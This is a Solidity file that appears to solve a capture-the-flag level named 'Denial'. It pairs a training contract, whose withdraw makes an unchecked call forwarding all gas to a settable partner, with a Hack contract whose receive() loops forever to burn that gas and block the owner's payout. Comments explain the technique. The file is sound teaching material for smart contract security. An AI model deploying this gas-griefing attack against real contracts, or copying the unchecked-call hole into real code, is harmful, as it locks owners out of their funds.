// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Hack {
  Denial denial;
  constructor(Denial _addr) public {
    denial = _addr;
  }
 
  function hack() public {
    denial.setWithdrawPartner(address(this));
    denial.withdraw();
    
  }
  
  receive() external payable { 
      while(true) {} //this will use all the gas, and hence the next statements in withdraw function would not be called.
  }
}
contract Denial {

    address public partner; // withdrawal partner - pay the gas, split the withdraw
    address public constant owner = address(0xA9E);
    uint timeLastWithdrawn;
    mapping(address => uint) withdrawPartnerBalances; // keep track of partners balances

    function setWithdrawPartner(address _partner) public {
        partner = _partner;
    }

    // withdraw 1% to recipient and 1% to owner
    function withdraw() public {
        uint amountToSend = address(this).balance / 100;
        // perform a call without checking return
        // The recipient can revert, the owner will still get their share
        partner.call{value:amountToSend}("");  
        payable(owner).transfer(amountToSend); //will not be executed since all the gas is consumed already.
        // keep track of last withdrawal time
        timeLastWithdrawn = block.timestamp;
        withdrawPartnerBalances[partner] +=  amountToSend;
    }

    // allow deposit of funds
    receive() external payable {}

    // convenience function
    function contractBalance() public view returns (uint) {
        return address(this).balance;
    }
}


//set the partner as your hack contract. Then call withdraw function. In withdraw function, partner.call will
//call the receive of our hack contract. And the receive is using all the gas making it impossible to 
//execute remaining instructions of withdraw functions.

// An interesting fact about the call() function is that it forwards all the gas along with the call unless
// a gas value is specified in the call. The transfer() and send() only forwards 2300 gas.
//So we used up all that gas using infinite loop.